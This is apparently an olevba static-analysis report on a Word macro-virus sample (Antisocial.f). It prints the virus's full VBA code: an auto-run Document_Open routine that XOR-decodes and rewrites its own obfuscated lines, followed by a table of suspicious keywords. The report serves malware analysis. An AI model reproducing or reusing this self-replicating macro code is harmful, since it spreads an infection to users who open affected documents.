olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.f-59fd0dd909d9f7c863b0bbbcb3aecdf57d4eff41
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.f-59fd0dd909d9f7c863b0bbbcb3aecdf57d4eff41 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 28: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'5Juqljkv+Vds`KjwhdiUwjhuq%8%5
'7Hwsnhit)DhianujDhiqbutnhit':'7='Hwsnhit)QnurtWuhsbdsnhi':'7
'2Kd"Omlvj*Lmu+"?"32"Clf"Fc{*Lmu+"?"33"Vjgl"Oqe@mz" MAV33/:2-N[Q"KQ"@NKQQ
'4Mb$Ikjpl,Jks-$9$54$Ej`$@e},Jks-$9$55$Plaj$Aj`
'1Rdu!BL!<!UihrEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd
'3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'4Wap$JP$9$JkviehPaithepa*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha
'2Dmp"f"?"4"Vm"0:8"A&"?"  8"K"?"*AO,Nklgq*f."3++8"Pclfmokxg"Vkogp
'1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B
'8\`a{Lgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm&ZmxdikmDafm(l$(*/*(.(n(.(I2(Fmp|(l
'1LB!<!BL/Mhodr)0-!BL/BntouNgMhodr(
'2CF,FgngvgNklgq"3."CF,AmwlvMdNklgq8"CF,CffDpmoQvpkle"OA
'8F\&Lmdm|mDafm{(9$(F\&Kg}f|GnDafm{2(F\&IllNzge[|zafo(EK
'2CavktgFmawoglv,QctgCq"DkngLcog8?CavktgFmawoglv,DwnnLcog
'2Kd"VjkqFmawoglv"?"LmpocnVgorncvg"Vjgl"Glf
'1Hg!Enbtldour/Bntou!?!0!Uido
'5H|v`ic%8%QmlvAjfph`kq+CpiiKdh`
'6@it&HIB&;&7&Ri&Bieskchru(Eishr
'1Hg!Enbtldour/Hudl)ONE(/GtmmO`ld!<!Lxrdmg!Uido!FnUn!Idmmn
'2Ukvj"Fmawoglvq,Kvgo*LMF+,T@Rpmhgav,T@Amormlglvq,Kvgo*3+,AmfgOmfwng
'5+A`i`q`Ilk`v%4)%+FjpkqJcIlk`v?%+DaaCwjhVqwlkb%HF?%@ka%Rlqm
'2Fmawoglvq,Kvgo*LMF+,QctgCq"DkngLcog8?Fmawoglvq,Kvgo*LMF+,DwnnLcog
'8@mddg2(Fmp|(FGL2(Mfl(An
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

